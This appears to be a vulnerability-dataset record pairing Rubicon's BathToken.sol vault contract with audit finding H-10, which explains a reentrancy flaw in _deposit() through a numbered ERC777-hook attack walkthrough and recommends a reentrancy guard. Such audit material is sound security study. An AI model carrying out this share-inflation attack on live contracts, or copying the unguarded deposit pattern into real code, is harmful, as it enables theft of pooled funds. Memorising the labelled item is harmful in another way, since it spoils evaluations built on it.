asset of the Bath Token vault\n    IERC20 public underlyingToken;\n\n    /// @notice The basis point fee rate that is paid on withdrawing the underlyingToken and bonusTokens\n    uint256 public feeBPS;\n\n    /// @notice ** ERC-20 **\n    uint256 public totalSupply;\n\n    /// @notice The amount of underlying deposits that are outstanding attempting market-making on the order book for yield\n    /// @dev quantity of underlyingToken that is in the orderbook that the pool still has a claim on\n    /// @dev The underlyingToken is effectively mark-to-marketed when it enters the book and it could be returned at a loss due to poor strategist performance\n    /// @dev outstandingAmount is NOT inclusive of any non-underlyingToken assets sitting on the Bath Tokens that have filled to here and are awaiting rebalancing to the underlyingToken by strategists\n    uint256 public outstandingAmount;\n\n    /// @dev Intentionally unused DEPRECATED STORAGE VARIABLE to maintain contiguous state on proxy-wrapped contracts. Consider it a beautiful scar of incremental progress \ud83d\udcc8\n    /// @dev Keeping deprecated variables maintains consistent network-agnostic contract abis when moving to new chains and versions\n    uint256[] deprecatedStorageArray; // Kept in to avoid storage collision bathTokens that are proxy upgraded\n\n    /// @dev Intentionally unused DEPRECATED STORAGE VARIABLE to maintain contiguous state on proxy-wrapped contracts. Consider it a beautiful scar of incremental progress \ud83d\udcc8\n    mapping(uint256 => uint256) deprecatedMapping; // Kept in to avoid storage collision on bathTokens that are upgraded\n    // *******************************************\n\n    /// @notice  ** ERC-20 **\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    /// @notice EIP-2612\n    bytes32 public DOMAIN_SEPARATOR;\n\n    /// @notice EIP-2612\n    /// @dev keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");\n    bytes32 public constant PERMIT_TYPEHASH =\n        0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;\n\n    /// @notice EIP-2612\n    mapping(address => uint256) public nonces;\n\n    /// @notice Array of Bonus ERC-20 tokens that are given as liquidity incentives to pool withdrawers\n    address[] public bonusTokens;\n\n    /// @notice Address of the OZ Vesting Wallet which acts as means to vest bonusToken incentives to pool HODLers\n    IBathBuddy public rewardsVestingWallet;\n\n    /// *** Events ***\n\n    /// @notice ** ERC-20 **\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n\n    /// @notice ** ERC-20 **\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /// @notice Time of Bath Token instantiation\n    event LogInit(uint256 timeOfInit);\n\n    /// @notice Log details about a pool deposit\n    event LogDeposit(\n        uint256 depositedAmt,\n        IERC20 asset,\n        uint256 sharesReceived,\n        address depositor,\n        uint256 underlyingBalance,\n        uint256 outstandingAmount,\n        uint256 totalSupply\n    );\n\n    /// @notice Log details about a pool withdraw\n    event LogWithdraw(\n        uint256 amountWithdrawn,\n        IERC20 asset,\n        uint256 sharesWithdrawn,\n        address withdrawer,\n        uint256 fee,\n        address feeTo,\n        uint256 underlyingBalance,\n        uint256 outstandingAmount,\n        uint256 totalSupply\n    );\n\n    /// @notice Log details about a pool rebalance\n    event LogRebalance(\n        IERC20 pool_asset,\n        address destination,\n        IERC20 transferAsset,\n        uint256 rebalAmt,\n        uint256 stratReward,\n        uint256 underlyingBalance,\n        uint256 outstandingAmount,\n        uint256 totalSupply\n    );\n\n    /// @notice Log details about a pool order canceled in the Rubicon Market book\n    event LogPoolCancel(\n        uint256 orderId,\n        IERC20 pool_asset,\n        uint256 outstandingAmountToCancel,\n        uint256 underlyingBalance,\n        uint256 outstandingAmount,\n        uint256 totalSupply\n    );\n\n    /// @notice Log details about a pool order placed in the Rubicon Market book\n    event LogPoolOffer(\n        uint256 id,\n        IERC20 pool_asset,\n        uint256 underlyingBalance,\n        uint256 outstandingAmount,\n        uint256 totalSupply\n    );\n\n    /// @notice Log the credit to outstanding amount for funds that have been filled market-making\n    event LogRemoveFilledTradeAmount(\n        IERC20 pool_asset,\n        uint256 fillAmount,\n        uint256 underlyingBalance,\n        uint256 outstandingAmount,\n        uint256 totalSupply\n    );\n\n    /// @notice * EIP 4626 *\n    event Deposit(\n        address indexed caller,\n        address indexed owner,\n        uint256 assets,\n        uint256 shares\n    );\n\n    /// @notice * EIP 4626 *\n    event Withdraw(\n        address indexed caller,\n        address indexed receiver,\n        address indexed owner,\n        uint256 assets,\n        uint256 shares\n    );\n\n    /// *** Constructor ***\n\n    /// @notice Proxy-safe initialization of storage; the constructor\n    function initialize(\n        ERC20 token,\n        address market,\n        address _feeTo\n    ) external {\n        require(!initialized);\n        string memory _symbol = string(\n            abi.encodePacked((\"bath\"), token.symbol())\n        );\n        symbol = _symbol;\n        underlyingToken = token;\n        RubiconMarketAddress = market;\n        bathHouse = msg.sender; //NOTE: assumed admin is creator on BathHouse\n\n        uint256 chainId;\n        assembly {\n            chainId := chainid()\n        }\n        DOMAIN_SEPARATOR = keccak256(\n            abi.encode(\n                keccak256(\n                    \"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"\n                ),\n                keccak256(bytes(name)),\n                keccak256(bytes(\"1\")),\n                chainId,\n                address(this)\n            )\n        );\n        name = string(abi.encodePacked(_symbol, (\" v1\")));\n        decimals = token.decimals(); // v1 Change - 4626 Adherence\n\n        // Add infinite approval of Rubicon Market for this asset\n        IERC20(address(token)).approve(RubiconMarketAddress, 2**256 - 1);\n        emit LogInit(block.timestamp);\n\n        feeTo = address(this); //This contract is the fee recipient, rewarding HODLers\n        feeBPS = 3; //Fee set to 3 BPS initially\n\n        // Complete constract instantiation\n        initialized = true;\n    }\n\n    /// *** Modifiers ***\n\n    modifier onlyPair() {\n        require(\n            IBathHouse(bathHouse).isApprovedPair(msg.sender) == true,\n            \"not an approved pair - bathToken\"\n        );\n        _;\n    }\n\n    modifier onlyBathHouse() {\n        require(\n            msg.sender == bathHouse,\n            \"caller is not bathHouse - BathToken.sol\"\n        );\n        _;\n    }\n\n    /// *** External Functions - Only Bath House / Admin ***\n\n    /// @notice Admin-only function to set a Bath Token's market address\n    function setMarket(address newRubiconMarket) external onlyBathHouse {\n        RubiconMarketAddress = newRubiconMarket;\n    }\n\n    /// @notice Admin-only function to set a Bath Token's Bath House admin\n    function setBathHouse(address newBathHouse) external onlyBathHouse {\n        bathHouse = newBathHouse;\n    }\n\n    /// @notice Admin-only function to approve Bath Token's RubiconMarketAddress with the maximum integer value (infinite approval)\n    function approveMarket() external onlyBathHouse {\n        underlyingToken.approve(RubiconMarketAddress, 2**256 - 1);\n    }\n\n    /// @notice Admin-only function to set a Bath Token's feeBPS\n    function setFeeBPS(uint256 _feeBPS) external onlyBathHouse {\n        feeBPS = _feeBPS;\n    }\n\n    /// @notice Admin-only function to set a Bath Token's fee recipient, typically the pool itself\n    function setFeeTo(address _feeTo) external onlyBathHouse {\n        feeTo = _feeTo;\n    }\n\n    /// @notice Admin-only function to add a bonus token to bonusTokens for pool incentives\n    function setBonusToken(address newBonusERC20) external onlyBathHouse {\n        bonusTokens.push(newBonusERC20);\n    }\n\n    /// *** External Functions - Only Approved Bath Pair / Strategist Contract ***\n\n    /// ** Rubicon Market Functions **\n\n    /// @notice The function for a strategist to cancel an outstanding Market Offer\n    function cancel(uint256 id, uint256 amt) external onlyPair {\n        outstandingAmount = outstandingAmount.sub(amt);\n        IRubiconMarket(RubiconMarketAddress).cancel(id);\n\n        emit LogPoolCancel(\n            id,\n            IERC20(underlyingToken),\n            amt,\n            underlyingBalance(),\n            outstandingAmount,\n            totalSupply\n        );\n    }\n\n    /// @notice A function called by BathPair to maintain proper accounting of outstandingAmount\n    function removeFilledTradeAmount(uint256 amt) external onlyPair {\n        outstandingAmount = outstandingAmount.sub(amt);\n        emit LogRemoveFilledTradeAmount(\n            IERC20(underlyingToken),\n            amt,\n            underlyingBalance(),\n            outstandingAmount,\n            totalSupply\n        );\n    }\n\n    /// @notice The function that places a bid and/or ask in the orderbook for a given pair from this pool\n    function placeOffer(\n        uint256 pay_amt,\n        ERC20 pay_gem,\n        uint256 buy_amt,\n        ERC20 buy_gem\n    ) external onlyPair returns (uint256) {\n        // Place an offer in RubiconMarket\n        // If incomplete offer return 0\n        if (\n            pay_amt == 0 ||\n            pay_gem == ERC20(0) ||\n            buy_amt == 0 ||\n            buy_gem == ERC20(0)\n        ) {\n            return 0;\n        }\n\n        uint256 id = IRubiconMarket(RubiconMarketAddress).offer(\n            pay_amt,\n            pay_gem,\n            buy_amt,\n            buy_gem,\n            0,\n            false\n        );\n        outstandingAmount = outstandingAmount.add(pay_amt);\n\n        emit LogPoolOffer(\n            id,\n            IERC20(underlyingToken),\n            underlyingBalance(),\n            outstandingAmount,\n            totalSupply\n        );\n        return (id);\n    }\n\n    /// @notice This function returns filled orders to the correct liquidity pool and sends strategist rewards to the Bath Pair\n    /// @dev Sends non-underlyingToken fill elsewhere in the Pools system, typically it's sister asset within a trading pair (e.g. ETH-USDC)\n    /// @dev Strategists presently accrue rewards in the filled asset not underlyingToken\n    function rebalance(\n        address destination,\n        address filledAssetToRebalance, /* sister or fill asset */\n        uint256 stratProportion,\n        uint256 rebalAmt\n    ) external onlyPair {\n        uint256 stratReward = (stratProportion.mul(rebalAmt)).div(10000);\n        IERC20(filledAssetToRebalance).transfer(\n            destination,\n            rebalAmt.sub(stratReward)\n        );\n        IERC20(filledAssetToRebalance).transfer(msg.sender, stratReward);\n\n        emit LogRebalance(\n            IERC20(underlyingToken),\n            destination,\n            IERC20(filledAssetToRebalance),\n            rebalAmt,\n            stratReward,\n            underlyingBalance(),\n            outstandingAmount,\n            totalSupply\n        );\n    }\n\n    /// *** EIP 4626 Implementation ***\n    // https://eips.ethereum.org/EIPS/eip-4626#specification\n\n    /// @notice Withdraw your bathTokens for the underlyingToken\n    function withdraw(uint256 _shares)\n        external\n        returns (uint256 amountWithdrawn)\n    {\n        return _withdraw(_shares, msg.sender);\n    }\n\n    /// @notice * EIP 4626 *\n    function asset() public view returns (address assetTokenAddress) {\n        assetTokenAddress = address(underlyingToken);\n    }\n\n    /// @notice * EIP 4626 *\n    function totalAssets() public view returns (uint256 totalManagedAssets) {\n        return underlyingBalance();\n    }\n\n    /// @notice * EIP 4626 *\n    function convertToShares(uint256 assets)\n        public\n        view\n        returns (uint256 shares)\n    {\n        // Note: Inflationary tokens may affect this logic\n        (totalSupply == 0) ? shares = assets : shares = (\n            assets.mul(totalSupply)\n        ).div(totalAssets());\n    }\n\n    // Note: MUST NOT be inclusive of any fees that are charged against assets in the Vault.\n    /// @notice * EIP 4626 *\n    function convertToAssets(uint256 shares)\n        public\n        view\n        returns (uint256 assets)\n    {\n        assets = (totalAssets().mul(shares)).div(totalSupply);\n    }\n\n    // Note: Unused function param to adhere to standard\n    /// @notice * EIP 4626 *\n    function maxDeposit(address receiver)\n        public\n        pure\n        returns (uint256 maxAssets)\n    {\n        maxAssets = 2**256 - 1; // No limit on deposits in current implementation  = Max UINT\n    }\n\n    /// @notice * EIP 4626 *\n    function previewDeposit(uint256 assets)\n        public\n        view\n        returns (uint256 shares)\n    {\n        // The exact same logic is used, no deposit fee - only difference is deflationary token check (rare condition and probably redundant)\n        shares = convertToShares(assets);\n    }\n\n    // Single asset override to reflect old functionality\n    function deposit(uint256 assets) public returns (uint256 shares) {\n        // Note: msg.sender is the same throughout the same contract context\n        return _deposit(assets, msg.sender);\n    }\n\n    /// @notice * EIP 4626 *\n    function deposit(uint256 assets, address receiver)\n        public\n        returns (uint256 shares)\n    {\n        return _deposit(assets, receiver);\n    }\n\n    // Note: Unused function param to adhere to standard\n    /// @notice * EIP 4626 *\n    function maxMint(address receiver) public pure returns (uint256 maxShares) {\n        maxShares = 2**256 - 1; // No limit on shares that could be created via deposit in current implementation - Max UINT\n    }\n\n    // Given I want these shares, how much do I have to deposit\n    /// @notice * EIP 4626 *\n    function previewMint(uint256 shares) public view returns (uint256 assets) {\n        (totalSupply == 0) ? assets = shares : assets = (\n            shares.mul(totalAssets())\n        ).div(totalSupply);\n    }\n\n    // Mints exactly shares Vault shares to receiver by depositing amount of underlying tokens.\n    /// @notice * EIP 4626 *\n    function mint(uint256 shares, address receiver)\n        public\n        returns (uint256 assets)\n    {\n        assets = previewMint(shares);\n        uint256 _shares = _deposit(assets, receiver);\n        require(_shares == shares, \"did not mint expected share count\");\n    }\n\n    // A user can withdraw whatever they hold\n    /// @notice * EIP 4626 *\n    function maxWithdraw(address owner)\n        public\n        view\n        returns (uint256 maxAssets)\n    {\n        if (totalSupply == 0) {\n            maxAssets = 0;\n        } else {\n            uint256 ownerShares = balanceOf[owner];\n            maxAssets = convertToAssets(ownerShares);\n        }\n    }\n\n    /// @notice * EIP 4626 *\n    function previewWithdraw(uint256 assets)\n        public\n        view\n        returns (uint256 shares)\n    {\n        if (totalSupply == 0) {\n            shares = 0;\n        } else {\n            uint256 amountWithdrawn;\n            uint256 _fee = assets.mul(feeBPS).div(10000);\n            amountWithdrawn = assets.sub(_fee);\n            shares = convertToShares(amountWithdrawn);\n        }\n    }\n\n    /// @notice * EIP 4626 *\n    function withdraw(\n        uint256 assets,\n        address receiver,\n        address owner\n    ) public returns (uint256 shares) {\n        require(\n            owner == msg.sender,\n            \"This implementation does not support non-sender owners from withdrawing user shares\"\n        );\n        uint256 expectedShares = previewWithdraw(assets);\n        uint256 assetsReceived = _withdraw(expectedShares, receiver);\n        require(\n            assetsReceived >= assets,\n            \"You cannot withdraw the amount of assets you expected\"\n        );\n        shares = expectedShares;\n    }\n\n    // Constraint: msg.sender is owner of shares when withdrawing\n    /// @notice * EIP 4626 *\n    function maxRedeem(address owner) public view returns (uint256 maxShares) {\n        return balanceOf[owner];\n    }\n\n    // Constraint: msg.sender is owner of shares when withdrawing\n    /// @notice * EIP 4626 *\n    function previewRedeem(uint256 shares)\n        public\n        view\n        returns (uint256 assets)\n    {\n        uint256 r = (underlyingBalance().mul(shares)).div(totalSupply);\n        uint256 _fee = r.mul(feeBPS).div(10000);\n        assets = r.sub(_fee);\n    }\n\n    /// @notice * EIP 4626 *\n    function redeem(\n        uint256 shares,\n        address receiver,\n        address owner\n    ) public returns (uint256 assets) {\n        require(\n            owner == msg.sender,\n            \"This implementation does not support non-sender owners from withdrawing user shares\"\n        );\n        assets = _withdraw(shares, receiver);\n    }\n\n    /// *** Internal Functions ***\n\n    /// @notice Deposit assets for the user and mint Bath Token shares to receiver\n    function _deposit(uint256 assets, address receiver)\n        internal\n        returns (uint256 shares)\n    {\n        uint256 _pool = underlyingBalance();\n        uint256 _before = underlyingToken.balanceOf(address(this));\n\n        // **Assume caller is depositor**\n        underlyingToken.transferFrom(msg.sender, address(this), assets);\n        uint256 _after = underlyingToken.balanceOf(address(this));\n        assets = _after.sub(_before); // Additional check for deflationary tokens\n\n        (totalSupply == 0) ? shares = assets : shares = (\n            assets.mul(totalSupply)\n        ).div(_pool);\n\n        // Send shares to designated target\n        _mint(receiver, shares);\n        emit LogDeposit(\n            assets,\n            underlyingToken,\n            shares,\n            msg.sender,\n            underlyingBalance(),\n            outstandingAmount,\n            totalSupply\n        );\n        emit Deposit(msg.sender, msg.sender, assets, shares);\n    }\n\n    /// @notice Withdraw share for the user and send underlyingToken to receiver with any accrued yield and incentive tokens\n    function _withdraw(uint256 _shares, address receiver)\n        internal\n        returns (uint256 amountWithdrawn)\n    {\n        uint256 _initialTotalSupply = totalSupply;\n\n        // Distribute network rewards first in order to handle bonus token == underlying token case; it only releases vested tokens in this call\n        distributeBonusTokenRewards(receiver, _shares, _initialTotalSupply);\n\n        uint256 r = (underlyingBalance().mul(_shares)).div(_initialTotalSupply);\n        _burn(msg.sender, _shares);\n        uint256 _fee = r.mul(feeBPS).div(10000);\n        // If FeeTo == address(0) then the fee is effectively accrued by the pool\n        if (feeTo != address(0)) {\n            underlyingToken.transfer(feeTo, _fee);\n        }\n        amountWithdrawn = r.sub(_fee);\n        underlyingToken.transfer(receiver, amountWithdrawn);\n\n        emit LogWithdraw(\n            amountWithdrawn,\n            underlyingToken,\n            _shares,\n            msg.sender,\n            _fee,\n            feeTo,\n            underlyingBalance(),\n            outstandingAmount,\n            totalSupply\n        );\n        emit Withdraw(\n            msg.sender,\n            receiver,\n            msg.sender,\n            amountWithdrawn,\n            _shares\n        );\n    }\n\n    /// @notice Function to distibute non-underlyingToken Bath Token incentives to pool withdrawers\n    /// @dev Note that bonusTokens adhere to the same feeTo and feeBPS pattern. Fees sit on BathBuddy to act as effectively accrued to the pool.\n    function distributeBonusTokenRewards(\n        address receiver,\n        uint256 sharesWithdrawn,\n        uint256 initialTotalSupply\n    ) internal {\n        if (bonusTokens.length > 0) {\n            for (uint256 index = 0; index < bonusTokens.length; index++) {\n                IERC20 token = IERC20(bonusTokens[index]);\n                // Note: Shares already burned in Bath Token _withdraw\n\n                // Pair each bonus token with a lightly adapted OZ Vesting wallet. Each time a user withdraws, they\n                //  are released their relative share of this pool, of vested BathBuddy rewards\n                // The BathBuddy pool should accrue ERC-20 rewards just like OZ VestingWallet and simply just release the withdrawer's relative share of releaseable() tokens\n                if (rewardsVestingWallet != IBathBuddy(0)) {\n                    rewardsVestingWallet.release(\n                        (token),\n                        receiver,\n                        sharesWithdrawn,\n                        initialTotalSupply,\n                        feeBPS\n                    );\n                }\n            }\n        }\n    }\n\n    /// *** ERC - 20 Standard ***\n\n    function _mint(address to, uint256 value) internal {\n        totalSupply = totalSupply.add(value);\n        balanceOf[to] = balanceOf[to].add(value);\n        emit Transfer(address(0), to, value);\n    }\n\n    function _burn(address from, uint256 value) internal {\n        balanceOf[from] = balanceOf[from].sub(value);\n        totalSupply = totalSupply.sub(value);\n        emit Transfer(from, address(0), value);\n    }\n\n    function _approve(\n        address owner,\n        address spender,\n        uint256 value\n    ) private {\n        allowance[owner][spender] = value;\n        emit Approval(owner, spender, value);\n    }\n\n    function _transfer(\n        address from,\n        address to,\n        uint256 value\n    ) private {\n        balanceOf[from] = balanceOf[from].sub(value);\n        balanceOf[to] = balanceOf[to].add(value);\n        emit Transfer(from, to, value);\n    }\n\n    function approve(address spender, uint256 value) external returns (bool) {\n        _approve(msg.sender, spender, value);\n        return true;\n    }\n\n    function transfer(address to, uint256 value) external returns (bool) {\n        _transfer(msg.sender, to, value);\n        return true;\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 value\n    ) external returns (bool) {\n        if (allowance[from][msg.sender] != uint256(-1)) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(\n                value\n            );\n        }\n        _transfer(from, to, value);\n        return true;\n    }\n\n    /// @notice EIP 2612\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external {\n        require(deadline >= block.timestamp, \"bathToken: EXPIRED\");\n        bytes32 digest = keccak256(\n            abi.encodePacked(\n                \"\\x19\\x01\",\n                DOMAIN_SEPARATOR,\n                keccak256(\n                    abi.encode(\n                        PERMIT_TYPEHASH,\n                        owner,\n                        spender,\n                        value,\n                        nonces[owner]++,\n                        deadline\n                    )\n                )\n            )\n        );\n        address recoveredAddress = ecrecover(digest, v, r, s);\n        require(\n            recoveredAddress != address(0) && recoveredAddress == owner,\n            \"bathToken: INVALID_SIGNATURE\"\n        );\n        _approve(owner, spender, value);\n    }\n\n    /// *** View Functions ***\n\n    /// @notice The underlying ERC-20 that this bathToken handles\n    function underlyingERC20() external view returns (address) {\n        return address(underlyingToken);\n    }\n\n    /// @notice The best-guess total claim on assets the Bath Token has\n    /// @dev returns the amount of underlying ERC20 tokens in this pool in addition to any tokens that are outstanding in the Rubicon order book seeking market-making yield (outstandingAmount)\n    function underlyingBalance() public view returns (uint256) {\n        uint256 _pool = IERC20(underlyingToken).balanceOf(address(this));\n        return _pool.add(outstandingAmount);\n    }\n}\n\n\n",
        "CodeNames": [
            "IBathToken.sol",
            "RubiconMarket.sol",
            "BathToken.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-10",
                "Location": [
                    "//solidity\nfunction _deposit(uint256 assets, address receiver)\n    internal\n    returns (uint256 shares)\n{\n    uint256 _pool = underlyingBalance();\n    uint256 _before = underlyingToken.balanceOf(address(this));\n\n    // Assume caller is depositor\n    underlyingToken.transferFrom(msg.sender, address(this), assets);\n    uint256 _after = underlyingToken.balanceOf(address(this));\n    assets = _after.sub(_before); // Additional check for deflationary tokens\n    ...\n"
                ],
                "Type": "  BathToken.sol#_deposit()  attacker can mint more shares with re-entrancy from hookable tokens",
                "Description": "\nBathToken.sol#_deposit() calculates the actual transferred amount by comparing the before and after balance, however, since there is no reentrancy guard on this function, there is a risk of re-entrancy attack to mint more shares.\n\nSome token standards, such as ERC777, allow a callback to the source of the funds (the from address) before the balances are updated in transferFrom(). This callback could be used to re-enter the function and inflate the amount.\n\n<https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L557-L568\n\nsolidity\nfunction _deposit(uint256 assets, address receiver)\n    internal\n    returns (uint256 shares)\n{\n    uint256 _pool = underlyingBalance();\n    uint256 _before = underlyingToken.balanceOf(address(this));\n\n    // Assume caller is depositor\n    underlyingToken.transferFrom(msg.sender, address(this), assets);\n    uint256 _after = underlyingToken.balanceOf(address(this));\n    assets = _after.sub(_before); // Additional check for deflationary tokens\n    ...\n\n\n\nWith a ERC777 token by using the ERC777TokensSender tokensToSend hook to re-enter the deposit() function.\n\nGiven:\n\n*   underlyingBalance(): 100_000e18 XYZ.\n*   totalSupply: 1e18\n\nThe attacker can create a contract with tokensToSend() function, then:\n\n1.  deposit(1)\n\n<!----\n\n      preBalance  = 100_000e18;\n      underlyingToken.transferFrom(msg.sender, address(this), 1)\n\n2.  reenter using tokensToSend hook for the 2nd call: deposit(1_000e18)\n    *   preBalance  = 100_000e18;\n    *   underlyingToken.transferFrom(msg.sender, address(this), 1_000e18)\n    *   postBalance = 101_000e18;\n    *   assets (actualDepositAmount) = 101_000e18 100_000e18 = 1_000e18;\n    *   mint 1000 shares;\n3.  continue with the first deposit() call:\n    *   underlyingToken.transferFrom(msg.sender, address(this), 1)\n    *   postBalance = 101_000e18 + 1;\n    *   assets (actualDepositAmount) = (101_000e18 + 1) 100_000e18 = 1_000e18 + 1;\n    *   mint 1000 shares;\n\nAs a result, with only 1 + 1_000e18 transferred to the contract, the attacker minted 2_000e18 XYZ worth of shares.\n\n",
                "Repair": "\nConsider adding nonReentrant modifier from OZ's ReentrancyGuard.\n\nbghughes (Rubicon) marked as duplicate and commented(https://github.com/code-423n4/2022-05-rubicon-findings/issues/350#issuecomment-1146476255):\n  Duplicate of #283(https://github.com/code-423n4/2022-05-rubicon-findings/issues/283) #410(https://github.com/code-423n4/2022-05-rubicon-findings/issues/410). Note that no ERC777 tokens will be created and this will be patched, making it a non-issue in practice.\n\nHickupHH3 (judge) commented(https://github.com/code-423n4/2022-05-rubicon-findings/issues/350#issuecomment-1163821101):\n  Not sure what is meant by \"no ERC777 tokens will be created\", since it's transferring the underlying token which is an arbitrary ERC20, and by extension, ERC777.\n \n The best practice is to break the CEI pattern for deposits and perform the interaction first. Or simply add reentrancy guards.\n\nbghughes (Rubicon) confirmed(https://github.com/code-423n4/2022-05-rubicon-findings/issues/350#event-7056728132)\n\n\n\n*\n\n \n\n"
            }
        ]
    }
]